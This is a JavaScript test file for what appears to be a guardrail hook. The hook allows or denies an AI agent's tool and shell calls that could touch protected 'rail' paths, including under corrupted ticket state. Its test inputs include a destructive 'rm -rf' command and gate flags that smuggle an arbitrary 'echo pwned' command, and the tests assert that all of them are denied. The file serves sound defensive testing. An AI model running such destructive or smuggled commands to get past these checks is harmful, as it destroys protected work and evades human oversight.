  // against @adlc/core over GENERATED rails instead of remembered cases:
  //
  //   if some path the rail matches has `target` as a proper prefix,
  //   then `target` is an ancestor of that rail.
  //
  // One-directional on purpose. Over-approximating is the safe direction and
  // the predicate does it deliberately for spellings a segment walk cannot
  // decide (`?`, character classes, an embedded `**`); MISSING one is the
  // failure that lets a mutation destroy a frozen rail.
  const RAIL_SEGMENTS = ['a', 'b', '*', '**', 'a*', 'a**b'];
  const NAMES = ['a', 'b', 'ab'];
  const combos = (alphabet, maxLen) => {
    const out = [];
    let level = [[]];
    for (let n = 0; n < maxLen; n++) {
      level = level.flatMap((prefix) => alphabet.map((s) => [...prefix, s]));
      out.push(...level);
    }
    return out;
  };
  const rails = combos(RAIL_SEGMENTS, 3).map((s) => s.join('/'));
  const targets = combos(NAMES, 2).map((s) => s.join('/'));
  // The concrete paths a rail could match, deep enough to run past a `**`.
  const universe = combos(NAMES, 4).map((s) => s.join('/'));
  const isProperPrefix = (prefix, path) => path.startsWith(`${prefix}/`);
  let checked = 0;
  for (const rail of rails) {
    // A LEADING `**` is the one documented exception: it anchors nothing, so
    // ancestor-destruction has no fixed root to be defined against and the
    // predicate returns false by design. Direct hits still cover it.
    if (rail.startsWith('**')) continue;
    for (const target of targets) {
      const reachable = universe.some((path) => globMatch(rail, path) && isProperPrefix(target, path));
      if (reachable) {
        assert.ok(targetIsRailAncestor(target, rail), `missed ancestor: target ${target} of rail ${rail}`);
        checked += 1;
      }
      // The narrowed mode answers a deliberately narrower question, so it may
      // say no where the full mode says yes — but never the reverse, or a
      // claimed file would be denied where a directory is not.
      if (targetIsRailAncestor(target, rail, { throughDoubleStar: false })) {
        assert.ok(targetIsRailAncestor(target, rail), `narrowed exceeded full: ${target} vs ${rail}`);
      }
    }
  }
  assert.ok(checked > 100, `property exercised only ${checked} real ancestor pairs`);
});

test('r: an embedded-globstar rail still denies its ancestor directory', () => {
  // End-to-end witness for the spelling a segment-wise matcher cannot decide.
  // The rail's concrete matches live under `a/foo`, so acting on that directory
  // destroys them even though it never matches the glob itself.
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['a/foo**bar/**'] }] } });
  try {
    const env = { ...ON, ADLC_TICKET: 'T1' };
    // A directory-affecting op: an unknown tool, and a shell removal.
    assert.equal(checkToolCall({ tool: 'custom_writer', args: { path: 'a/foo' }, root: dir, env }).decision, 'deny');
    assert.equal(checkShellCall({ command: 'rm -rf a/foo', root: dir, env }).decision, 'deny');
    // And through the narrowed mode, which a claimed file selects.
    assert.equal(checkToolCall({ tool: 'task', args: { filePath: 'a/foo' }, root: dir, env }).decision, 'deny');
    // A sibling directory the rail cannot reach still runs.
    assert.equal(checkToolCall({ tool: 'custom_writer', args: { path: 'b/foo' }, root: dir, env }).decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: a rail thousands of globstars deep still yields a decision', () => {
  // The other direction of the same hostile input: the RAIL is a string in the
  // ticket store, and a few thousand `**` segments is syntactically valid. A
  // per-segment stack frame would raise a RangeError out of the hook instead of
  // a rail decision, which is a broken gate rather than a strict one.
  const deep = `a/${'**/'.repeat(5000)}z`;
  assert.equal(targetIsRailAncestor('a/b.mjs', deep, { throughDoubleStar: false }), false);
  assert.equal(targetIsRailAncestor('a/b.mjs', deep), true);
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: [deep] }] } });
  try {
    const env = { ...ON, ADLC_TICKET: 'T1' };
    // A file the filesystem resolves takes the narrowed walk; anything else
    // takes the full one, which stops at the first `**`. Both must answer
    // rather than throw. Since #498 the key alone no longer picks the narrowed
    // walk for an ABSENT path, so the file is created to reach it.
    assert.equal(checkToolCall({ tool: 'task', args: { filePath: 'a/b.mjs' }, root: dir, env }).decision, 'deny');
    assert.equal(checkToolCall({ tool: 'task', args: { target: 'a/b.mjs' }, root: dir, env }).decision, 'deny');
    mkdirSync(join(dir, 'a'), { recursive: true });
    writeFileSync(join(dir, 'a', 'b.mjs'), '');
    assert.equal(checkToolCall({ tool: 'task', args: { filePath: 'a/b.mjs' }, root: dir, env }).decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: a file-specific key does not make an absent extensionless path a file', () => {
  // The key licenses the extension heuristic; it is not authoritative on its
  // own, because `filePath` is a key plenty of tools hand a directory. So an
  // absent `src/Makefile` keeps ancestor detection and is over-denied under an
  // interior-wildcard rail. Pinned as a DECISION, not left to be rediscovered:
  // the alternative direction (key wins outright) switches the check off for an
  // absent `{filePath: '.adlc'}` too, and this predicate only gates tools that
  // never write files, so over-denial here is a visible refusal rather than a
  // miss. A stat flips it the moment the file exists.
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**/test/*.mjs'] }] } });
  try {
    const env = { ...ON, ADLC_TICKET: 'T1' };
    for (const leaf of ['Makefile', 'Dockerfile', 'LICENSE']) {
      const r = checkToolCall({ tool: 'task', args: { targetFile: `src/${leaf}` }, root: dir, env });
      assert.equal(r.decision, 'deny', `absent src/${leaf} → ${r.reason}`);
    }
    mkdirSync(join(dir, 'src'), { recursive: true });
    writeFileSync(join(dir, 'src', 'Makefile'), '');
    const stated = checkToolCall({ tool: 'task', args: { targetFile: 'src/Makefile' }, root: dir, env });
    assert.equal(stated.decision, 'allow', `an existing file is resolved by stat → ${stated.reason}`);
    // The structured mutators are unaffected either way: they take the
    // singleFile path, which never asks the ancestor question.
    const writer = checkToolCall({ tool: 'write', args: { filePath: 'src/Dockerfile' }, root: dir, env });
    assert.equal(writer.decision, 'allow', writer.reason);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: conflicted ticket state denies ungated tools too, not just mutators', () => {
  // The ungated branch is the one that allows by DEFAULT, so falling through on
  // an unresolved rail set is the fail-open the other branches close.
  const dir = repo({ tickets: T1_RAILED });
  try {
    const env = { ...ON, ADLC_TICKET: 'T-DOES-NOT-EXIST' };
    // Carrying a target while the rail set is unresolved: nothing can vet it.
    for (const [tool, args] of [
      ['task', { target: 'src/anything.mjs' }],
      ['skill', { targetDir: 'src' }],
      ['todowrite', { edits: [{ target: 'src/x.mjs' }] }],
      ['write', { filePath: 'src/anything.mjs' }],
    ]) {
      const r = checkToolCall({ tool, args, root: dir, env });
      assert.equal(r.decision, 'deny', `${tool} → ${r.reason}`);
    }
    // A no-target ungated call is the normal case and stays allowed — denying it
    // would take down the very tools needed to repair the broken store.
    for (const [tool, args] of [['skill', {}], ['adlc_prosecute', {}], ['adlc_gate', { gate: 'spec-lint' }]]) {
      const r = checkToolCall({ tool, args, root: dir, env });
      assert.equal(r.decision, 'allow', `${tool} → ${r.reason}`);
    }
    // adlc_gate forwards a nested argv that carries no extractable target, so
    // the target check above cannot see it. A command-executor flag runs an
    // arbitrary program and a derived-write gate writes targets no argv scan can
    // vet — neither may run while the rail set is unresolved.
    for (const args of [
      { gate: 'preflight', args: ['--test-cmd', 'echo pwned'] },
      { gate: 'model-ratchet', args: ['--review-cmd', 'echo pwned'] },
      { gate: 'hollow-test' },
      { gate: 'spec-lint', args: ['--write'] },
    ]) {
      const r = checkToolCall({ tool: 'adlc_gate', args, root: dir, env });
      assert.equal(r.decision, 'deny', `${JSON.stringify(args)} → ${r.reason}`);
    }
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: under conflict a gate must be non-writing, not merely rails-safe', () => {
  // RAILS_SAFE_GATES answers "may this run while rails are FROZEN" — a known
  // rail set exists there, so a gate's fixed write targets can be vetted against
  // it. Under conflict there is no rail set to vet against, so a gate that
  // writes at all cannot be cleared. preflight is exactly that case: rails-safe
  // (its scratch probes are checkable) and NOT conflict-safe (they still write).
  const dir = repo({ tickets: T1_RAILED });
  try {
    const env = { ...ON, ADLC_TICKET: 'T-DOES-NOT-EXIST' };
    for (const gate of [...RAILS_SAFE_GATES].filter((g) => !CONFLICT_SAFE_GATES.has(g))) {
      const r = checkToolCall({ tool: 'adlc_gate', args: { gate }, root: dir, env });
      assert.equal(r.decision, 'deny', `${gate} → ${r.reason}`);
      assert.match(r.reason, /only a non-writing gate may run/);
    }
    // The diagnostics an operator needs to inspect the broken store stay usable.
    for (const gate of CONFLICT_SAFE_GATES) {
      const r = checkToolCall({ tool: 'adlc_gate', args: { gate }, root: dir, env });
      assert.equal(r.decision, 'allow', `${gate} → ${r.reason}`);
    }
    // Every conflict-safe gate is rails-safe: the conflict question is strictly
    // harder, so its answer set cannot be wider.
    for (const gate of CONFLICT_SAFE_GATES) {
      assert.ok(RAILS_SAFE_GATES.has(gate), `${gate} must also be rails-safe`);
    }
    // While rails are merely FROZEN the wider set still applies — this is a
    // conflict-only tightening, not a blanket demotion of preflight.
    const frozen = checkToolCall({ tool: 'adlc_gate', args: { gate: 'preflight', args: [] }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(frozen.decision, 'allow', frozen.reason);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: no conflict-safe gate package writes files or spawns processes', () => {
  // Membership in CONFLICT_SAFE_GATES is a claim about the gate's SOURCE: a
  // bare invocation can only read. Pin the claim to the source rather than to a
  // reviewer's memory of it, so a gate that grows a write path fails here
  // instead of quietly becoming allowed while the ticket store is broken.
  //
  // Scope of the claim: the gate's OWN sources. A few of these can reach a
  // ledger writer in @adlc/gate-manifest, but only through a verdict flag, and
  // under conflict any nested argv is denied before the gate name is consulted.
  const root = new URL('../../../packages/', import.meta.url);
  const WRITES = /\b(?:writeFileSync|appendFileSync|mkdirSync|rmSync|renameSync|copyFileSync|createWriteStream|writeFile|node:child_process)\b/;
  for (const gate of CONFLICT_SAFE_GATES) {
    const pkgDir = new URL(`${gate}/`, root);
    const files = [];
    const walk = (dir) => {
      for (const entry of readdirSync(dir, { withFileTypes: true })) {
        if (entry.name === 'node_modules' || entry.name === 'test') continue;
        const child = new URL(`${entry.name}${entry.isDirectory() ? '/' : ''}`, dir);
        if (entry.isDirectory()) walk(child);
        else if (entry.name.endsWith('.mjs')) files.push(child);
      }
    };
    walk(pkgDir);
    assert.ok(files.length > 0, `${gate}: no sources scanned — is the package path right?`);
    for (const file of files) {
      const src = readFileSync(file, 'utf8');
      assert.ok(!WRITES.test(src), `${gate}: ${file.pathname} writes or spawns — it cannot be conflict-safe`);
    }
  }
});

test('r: targetIsRailAncestor honors an anchored ** by default and can be narrowed', () => {
  // The two-argument form is the exported contract a sibling adapter gets, and
  // it is the FULL ancestor question; the narrowed form is opt-in. Pinned
  // directly because railHit always passes the option, so nothing else would
  // notice the default changing.
  assert.equal(targetIsRailAncestor('src', 'src/**'), true);
  assert.equal(targetIsRailAncestor('src/index.mjs', 'src/**/test/*.mjs'), true);
  // Narrowed: only the form an anchored ** creates goes away.
  assert.equal(targetIsRailAncestor('src/index.mjs', 'src/**/test/*.mjs', { throughDoubleStar: false }), false);
  // …every other ancestor form survives it, including through an interior
  // single-star segment, which is why this is not just "ancestors off".
  assert.equal(targetIsRailAncestor('assets.bundle', 'assets.bundle/**', { throughDoubleStar: false }), true);
  assert.equal(targetIsRailAncestor('packages/foo/test', 'packages/*/test/**', { throughDoubleStar: false }), true);
  // A target DEEPER than the rail is not its ancestor: `a/b/c` cannot be a
  // parent of `a/b`. Without a `**` the rail simply runs out first.
  assert.equal(targetIsRailAncestor('a/b/c', 'a/b'), false);
  assert.equal(targetIsRailAncestor('a/b/c', 'a/b', { throughDoubleStar: false }), false);
  // A LEADING ** anchors nothing, in either mode.
  assert.equal(targetIsRailAncestor('anything', '**/*.test.mjs'), false);
  assert.equal(targetIsRailAncestor('anything', '**/*.test.mjs', { throughDoubleStar: false }), false);
  // Narrowed, the question is whether the rail NAMES the target's LAST segment
  // and continues past it. How the earlier segments lined up is irrelevant, so
  // the ** may take zero segments or several.
  assert.equal(targetIsRailAncestor('src/cache.bundle', 'src/**/cache.bundle/**', { throughDoubleStar: false }), true);
  assert.equal(targetIsRailAncestor('src/foo/cache.bundle', 'src/**/cache.bundle/**', { throughDoubleStar: false }), true);
  assert.equal(targetIsRailAncestor('a/b', 'a/**/**/b/**', { throughDoubleStar: false }), true);
  assert.equal(targetIsRailAncestor('a/b/c', 'a/**/c/**', { throughDoubleStar: false }), true);
  // The boundary is the LAST segment: only the ** could hold `index.mjs` here,
  // and a ** matches any name at all, so the rail says nothing about this one.
  assert.equal(targetIsRailAncestor('src/index.mjs', 'src/**/cache.bundle/**', { throughDoubleStar: false }), false);
  // A rail that names the target and then STOPS is a direct hit, not ancestry —
  // globMatch's job, and not a reason to widen this one.
  assert.equal(targetIsRailAncestor('src/cache.bundle', 'src/**/cache.bundle', { throughDoubleStar: false }), false);
  // Segment matching uses the same semantics as the direct check: a partially
  // literal wildcard must not read as matching everything, or ancestor
  // detection denies paths the rail could never match.
  assert.equal(targetIsRailAncestor('packages/foo-x/cache.bundle', 'packages/foo-*/cache.bundle/**', { throughDoubleStar: false }), true);
  assert.equal(targetIsRailAncestor('packages/bar/cache.bundle', 'packages/foo-*/cache.bundle/**', { throughDoubleStar: false }), false);
  assert.equal(targetIsRailAncestor('packages/bar/test', 'packages/foo-*/test/**'), false);
  // An EMBEDDED `**` is the exception, because it spans `/` in @adlc/core:
  // `a/foo**bar/**` really does cover `a/foo/x/bar/frozen.mjs`, so `a/foo` is
  // an ancestor of it and no single segment can see that. Matching one segment
  // at a time must not read this as a mismatch.
  assert.equal(targetIsRailAncestor('a/foo', 'a/foo**bar/**'), true);
  assert.equal(targetIsRailAncestor('a/foo', 'a/foo**bar/**', { throughDoubleStar: false }), true);
});

test('r: a mutating/unknown tool with only a target still fails closed', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    for (const args of [{ target: 'src/ok.mjs' }, { target: 'test/frozen.test.mjs' }]) {
      const r = checkToolCall({ tool: 'custom_writer', args, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
      assert.equal(r.decision, 'deny', `${JSON.stringify(args)} → ${r.reason}`);
      assert.match(r.reason, /no extractable target path/);
    }
  } finally { rmSync(dir, { recursive: true, force: true }); }
});
